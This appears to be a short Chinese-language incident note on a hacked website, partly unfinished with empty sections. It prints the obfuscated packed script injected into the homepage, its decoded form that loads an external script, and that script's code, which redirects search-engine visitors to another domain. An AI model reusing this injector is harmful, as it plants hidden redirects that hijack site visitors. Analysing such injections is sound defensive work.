## 一、被入侵的系统

## 二、入侵路径


## 三、入侵后修改的文件

首页增加如下代码：
```
<script type="text/javascript">
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!
''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c]
)p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('o["\\e\\c\\1\\n\\f\\8\\m\\0"]["\\7\\3\\9\\0\\8"](\'\\g\\2\\1\\3\\9\\
4\\0 \\0\\k\\4\\8\\d\\6\\0\\8\\l\\0\\5\\h\\a\\j\\a\\2\\1\\3\\9\\4\\0\\6 \\2\\3\\1\\d\\6\\s\\0\\0\\4\\2\\t\\5\\5\\7\\7\\7\\b\\u\\1\\e
\\a\\2\\r\\b\\1\\c\\f\\5\\j\\q\\p\\b\\h\\2\\6\\i\\g\\5\\2\\1\\3\\9\\4\\0\\i\');',31,31,'x74|x63|x73|x72|x70|x2f|x22|x77|x65|x69|x61|
x2e|x6f|x3d|x64|x6d|x3c|x6a|x3e|x76|x79|x78|x6e|x75|window|x31|x36|x38|x68|x3a|x62'.split('|'),0,{}))
```

解密后是 
```
window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x77\x72\x69\x74\x65"]('\x3c\x73\x63\x72\x69\x70\x74 \x74\x79\x70\x65\x3d\x22\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22 \x73\x72\x63\x3d\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x62\x63\x64\x61\x73\x38\x2e\x63\x6f\x6d\x2f\x76\x36\x31\x2e\x6a\x73\x22\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e');
```

实际运行的代码是  `document write <script type="text/javascript" src="https://www.bcdas8.com/v61.js"> ` 之类的

`https://www.bcdas8.com/v61.js`内容是：
```
document.writeln("<script LANGUAGE=\"Javascript\">");
document.writeln("var s=document.referrer");
document.writeln("if(s.indexOf(\"baidu\")>0 || s.indexOf(\"sogou\")>0 || s.indexOf(\"soso\")>0 ||s.indexOf(\"sm\")>0 ||s.indexOf(\"uc\")>0 ||s.indexOf(\"bing\")>0 ||s.indexOf(\"yahoo\")>0 ||s.indexOf(\"so\")>0 )");
document.writeln("location.href=\"https://www.daswnsr.com/\";");
document.writeln("</script>");
```

## 四、处理

